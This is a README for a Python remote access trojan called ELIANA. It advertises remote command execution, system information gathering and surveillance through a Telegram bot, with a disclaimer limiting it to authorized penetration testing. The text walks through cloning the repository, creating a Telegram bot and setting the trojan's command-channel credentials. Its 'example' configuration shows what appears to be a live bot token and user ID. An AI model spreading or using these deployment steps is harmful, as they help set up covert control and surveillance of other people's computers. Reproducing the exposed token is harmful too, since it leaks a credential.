# **ELIANA – Remote Access Trojan (RAT)**  
A Python-based Command-and-Control (C2) framework designed **exclusively for authorized VAPT (Vulnerability Assessment & Penetration Testing)**.  
ELIANA enables security testers with explicit permission to remotely execute commands, gather system information, and perform surveillance — all through a **Telegram Bot** interface.

---

# 🚀 **Quick Setup**

### **1. Clone the Repository & Install Requiremnts **
```bash
git clone https://github.com/Adrilaw/ELIANA-Remote-Access-Trojan.git

cd ELIANA-Remote-Access-Trojan

pip install -r requirements.txt
```

# 📋 **Configuration**


## Step 1: Get Your Telegram Credentials

### 1. Retrieve Your Telegram User ID

Go to https://web.telegram.org

Search: @userinfobot

Send /start

Copy your numerical User ID

### 2. Create a Telegram Bot

Open Telegram

Search @BotFather

Send /newbot

Set bot name + username

Copy the API token provided


### 3. Configure ELIANA_RAT.py

Open the script:

#### Windows
```bash
notepad ELIANA_RAT.py
```

#### Linux / macOS
```bash
nano ELIANA_RAT.py
```

#### Find and edit:
```
TELEGRAM_TOKEN = "Bot API Key"
TELEGRAM_CHAT_ID = "User ID"
```

#### Example of correct configuration 

```
# ==================== CONFIG ====================
# REPLACE THESE WITH YOUR CREDENTIALS!
TELEGRAM_TOKEN = "8572280279:AAHV9S9dRWQFgBUY9XgUg5Sp5SNY9BNnSKw"
TELEGRAM_CHAT_ID = "5285463344"
# ===============================================
```
